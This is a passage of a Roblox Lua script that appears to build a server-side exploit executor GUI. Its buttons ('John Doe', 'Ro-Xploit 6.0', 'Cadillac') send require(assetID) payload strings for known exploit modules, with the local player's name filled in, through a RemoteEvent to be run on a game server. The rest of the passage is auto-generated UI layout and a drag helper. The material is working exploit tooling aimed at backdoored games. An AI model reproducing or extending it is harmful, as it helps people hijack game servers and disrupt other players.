TextButton_25.Text = "John Doe"
TextButton_25.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_25.TextSize = 21.000
TextButton_25.TextWrapped = true
TextButton_25.TextScaled=true
TextButton_25.MouseButton1Click:connect(function()
	e.Text = "require(2845929020).ooga('"..game.Players.LocalPlayer.Name.."')"
	Remote:FireServer(e.Text)
end)

UICorner_28.Parent = TextButton_25

TextButton_26.Parent = ScrollingFrame
TextButton_26.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
TextButton_26.BackgroundTransparency = 1.000
TextButton_26.BorderSizePixel = 0
TextButton_26.Position = UDim2.new(0.0789473653, 0, 0, 0)
TextButton_26.Size = UDim2.new(0, 97, 0, 27)
TextButton_26.ZIndex = 2
TextButton_26.Font = Enum.Font.GothamSemibold
TextButton_26.Text = "Ro-Xploit 6.0"
TextButton_26.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_26.TextSize = 21.000
TextButton_26.TextWrapped = true
TextButton_26.TextScaled=true
TextButton_26.MouseButton1Click:connect(function()
	e.Text = "require(6422837518).roxploitv6('"..game.Players.LocalPlayer.Name.."')"
	Remote:FireServer(e.Text)
end)

UICorner_29.Parent = TextButton_26

TextButton_27.Parent = ScrollingFrame
TextButton_27.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
TextButton_27.BackgroundTransparency = 1.000
TextButton_27.BorderSizePixel = 0
TextButton_27.Position = UDim2.new(0.0789473653, 0, 0, 0)
TextButton_27.Size = UDim2.new(0, 97, 0, 27)
TextButton_27.ZIndex = 2
TextButton_27.Font = Enum.Font.GothamSemibold
TextButton_27.Text = "Cadillac"
TextButton_27.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_27.TextSize = 21.000
TextButton_27.TextWrapped = true
TextButton_27.TextScaled=true
TextButton_27.MouseButton1Click:connect(function()
	e.Text = "require(4745872847).load('"..game.Players.LocalPlayer.Name.."')"
	Remote:FireServer(e.Text)
end)
-------------------------------------------- End of Scripts

UICorner_30.Parent = TextButton_27

Background.Name = "Background"
Background.Parent = Main
Background.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Background.Position = UDim2.new(0.75298804, 0, 0.116129033, 0)
Background.Size = UDim2.new(0, 114, 0, 225)
Background.Visible=false

UICorner_31.Parent = Background

TextLabel_2.Parent = Main
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0.75298804, 0, 0.0419354849, 0)
TextLabel_2.Size = UDim2.new(0, 93, 0, 17)
TextLabel_2.Font = Enum.Font.GothamSemibold
TextLabel_2.Text = "Unattached"
TextLabel_2.TextColor3 = Color3.fromRGB(223, 223, 223)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true

ImageLabel.Parent = Main
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.Position = UDim2.new(0.944223106, 0, 0.0354838707, 0)
ImageLabel.Size = UDim2.new(0, 20, 0, 20)
ImageLabel.Image = "rbxassetid://5920616445"
ImageLabel.ImageColor3 = Color3.fromRGB(255, 0, 0)

-- Dragify

local function GPPJUAZ_fake_script() -- Frame_2.Dragify 
	local script = Instance.new('LocalScript', Main)

	local UIS = game:GetService("UserInputService")
	function dragify(Frame)
		dragToggle = nil
		local dragSpeed = 0
		dragInput = nil
		dragStart = nil
		local dragPos = nil
		function updateInput(input)
			local Delta = input.Position - dragStart
			local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
			game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = Position}):Play()
		end
		Frame.InputBegan:Connect(function(input)
			if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
				dragToggle = true
				dragStart = input.Position
				startPos = Frame.Position
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragToggle = false
					end
				end)
			end
		end)
		Frame.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				dragInput = input
			end
		end)
		game:GetService("UserInputService").InputChanged:Connect(function(input)
			if input == dragInput and dragToggle then
				updateInput(input)
			end
		end)
	end

	dragify(script.Parent)
end
coroutine.wrap(GPPJUAZ_fake_script)()
